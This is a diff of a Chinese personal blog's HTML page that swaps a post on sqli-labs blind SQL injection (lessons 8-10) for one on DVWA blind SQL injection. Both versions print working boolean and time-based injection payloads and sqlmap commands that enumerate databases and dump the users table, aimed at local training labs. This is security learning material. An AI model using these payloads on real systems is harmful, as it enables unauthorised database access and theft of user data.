@@ -4,14 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sqli-lab  less8-10, 是小竹不是小猪">
-    <meta name="description" content="less8 –布尔型盲注使用sqlmap扫描，发现是单引号闭合。尝试一下，发现无报错信息。但是信息的正确和错误可以通过页面回显出来。
-一、猜测数据库长度
-and length(database())=8
+    <meta name="keywords" content="DVWA SQL Injection (blind), 是小竹不是小猪">
+    <meta name="description" content="Low手工注入：检查注入
 
+1&amp;quot; or&amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;#
 
-二、猜测数据库名
-and lef">
+1&amp;#39; or&amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;#
+
+发现前者报错，后者正确.
+
+因此可以采用的方法是布尔盲注，数据库名，表">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +25,7 @@ and lef">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sqli-lab  less8-10 | 是小竹不是小猪</title>
+    <title>DVWA SQL Injection (blind) | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -315,12 +317,12 @@ and lef">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqli-lab  less8-10</h1>
+                    <h1 class="description center-align post-title">DVWA SQL Injection (blind)</h1>
                 </div>
             </div>
         </div>
@@ -448,7 +450,7 @@ and lef">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-28
+                    2022-03-08
                 </div>
                 
 
@@ -469,44 +471,41 @@ and lef">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="less8-–布尔型盲注"><a href="#less8-–布尔型盲注" class="headerlink" title="less8 –布尔型盲注"></a>less8 –布尔型盲注</h2><p>使用sqlmap扫描，发现是单引号闭合。尝试一下，发现无报错信息。但是信息的正确和错误可以通过页面回显出来。</p>
-<p>一、猜测数据库长度</p>
-<pre><code class="sql">and length(database())=8
+                <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="手工注入："><a href="#手工注入：" class="headerlink" title="手工注入："></a>手工注入：</h3><p>检查注入</p>
+<pre><code class="sql">
+1&quot; or&#39;1&#39;=&#39;1&#39;#
+
+1&#39; or&#39;1&#39;=&#39;1&#39;#
+
+发现前者报错，后者正确.
 </code></pre>
-<p><img src="/2022/02/28/0228/3.PNG" alt="3"></p>
-<p>二、猜测数据库名</p>
-<pre><code>and left(database(),1)&gt;&#39;r&#39;
+<p>因此可以采用的方法是布尔盲注，数据库名，表名，列名，数据名均可以进行布尔盲注的猜测法；可见之前的博客<a target="_blank" rel="noopener" href="https://zhuyanzhen-lab.github.io/2022/02/28/0228/">sqli-lab less8-10 | 是小竹不是小猪 (zhuyanzhen-lab.github.io)</a></p>
+<h2 id="Sqlmap-注入"><a href="#Sqlmap-注入" class="headerlink" title="Sqlmap 注入"></a>Sqlmap 注入</h2><p>连接服务器，成功</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch
 </code></pre>
-<p>三、猜测数据库表名</p>
-<pre><code class="sql">?id=1’ and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101–+
+<p>获取数据库</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch -dbs
 </code></pre>
-<p>四、猜测列名</p>
-<pre><code class="sql">?id=1’ and (select ascii(substr((select columns_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)))=117–+
+<p>获取表名</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch -D dvwa --tables
 </code></pre>
-<p>除了使用猜测的方法，还可以使用sqlmap进行</p>
-<p><img src="/2022/02/28/0228/4.PNG" alt="4"></p>
-<h2 id="less9-–时间盲注"><a href="#less9-–时间盲注" class="headerlink" title="less9 –时间盲注"></a>less9 –时间盲注</h2><p>时间盲注的特点，和布尔注入一样没有报错信息。</p>
-<p>if (length(database())&gt;1,1,sleep(5))，这句语句的意思是查看当前数据库的长度是否大于1，大于1则查询1，小于1MySQL查询休眠5秒<br>if (substr(database()),1,1=’s’,1,sleep(5))，这句语句的意思是查看当前数据库的第一个字母是否为’s’，为’s’则查询1，不为’s’MySQL查询休眠5秒。</p>
-<p>进行burp抓包进行测试</p>
-<p>判断数据库的长度，把4进行爆破。</p>
-<pre><code class="sql">http://127.0.0.1/sqil/Less-9/?id=1&#39; and if(length(database())=4,1,sleep(5))--+
+<p>获取列名</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch -D dvwa -T users --columns
 </code></pre>
-<p>判断数据库的名称</p>
-<pre><code class="sql">http://127.0.0.1/sqil/Less-9/?id=1&#39; and if(substr(database(),1,1)=&#39;a&#39;,1,sleep(5))--+
+<p>获取数据</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch -D dvwa -T users --dump
 </code></pre>
-<p>将1和a设置为攻击点进行爆破。</p>
-<p>查找第一个表的第一个字母。</p>
-<pre><code>http://127.0.0.1/sql1/Less-9/?id=1&#39; and if(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;s&#39;,1,sleep(5))--+
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>利用burp进行抓包，发现提交数据id=1&amp;Submit=Submit</p>
+<p>于是利用sqlmap 进行注入</p>
+<p>获取服务器信息，成功。</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/#&quot; --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch
 </code></pre>
-<p>查找第一个字段的第一个字母</p>
-<pre><code>http://127.0.0.1/sql1/Less-9/?id=1&#39; and if(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;s&#39;,1,sleep(5))--+
+<p>然后依次进行注入即可。</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>查询cookie的方法是点击检查页面，点击网络和要进行查询的连接，可以看到cookie。</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/cookie-input.php&quot; --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/&quot; --cookie=&quot;security=high; PHPSESSID=vpuktak3jkvhong5mrdm62eri5&quot; --batch
 </code></pre>
-<p>查username字段的第一个值得第一个字母</p>
-<pre><code>http://127.0.0.1/sql1/Less-9/?id=1&#39; and if(substr((select username from security.users limit 0,1),1,1)=&#39;s&#39;,1,sleep(5))--+
-</code></pre>
-<h2 id="less10-–双引号时间盲注"><a href="#less10-–双引号时间盲注" class="headerlink" title="less10 –双引号时间盲注"></a>less10 –双引号时间盲注</h2><p>过程和less9一样，需要将id=1’改为id=1”</p>
-<p>本文参考诸多下面这篇文章，如有细节均可参考。</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kukudeshuo/article/details/114551467">https://blog.csdn.net/kukudeshuo/article/details/114551467</a></p>
+<p><img src="/2022/03/08/0309/4.PNG" alt="4"></p>
+<p><img src="/2022/03/08/0309/3.PNG" alt="3"></p>
 
                 
             </div>
@@ -533,7 +532,7 @@ and lef">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/02/28/0228/">http://example.com/2022/02/28/0228/</a>
+                    <a href="http://example.com/2022/03/08/0309/">http://example.com/2022/03/08/0309/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -744,13 +743,13 @@ and lef">
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/03/01/0301/">
+                <a href="/2022/03/09/0310/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="sqli-lab less11-12">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="DVWA Weak Session IDS">
                         
-                        <span class="card-title">sqli-lab less11-12</span>
+                        <span class="card-title">DVWA Weak Session IDS</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -761,7 +760,7 @@ and lef">
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-09
                         </span>
                         <span class="publish-author">
                             
@@ -781,13 +780,13 @@ and lef">
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/02/28/0227/">
+                <a href="/2022/03/07/0308/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="sqli-lab  less6-7">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="DVWA-SQL注入 medium high">
                         
-                        <span class="card-title">sqli-lab  less6-7</span>
+                        <span class="card-title">DVWA-SQL注入 medium high</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -798,7 +797,7 @@ and lef">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-07
                             </span>
                         <span class="publish-author">
                             
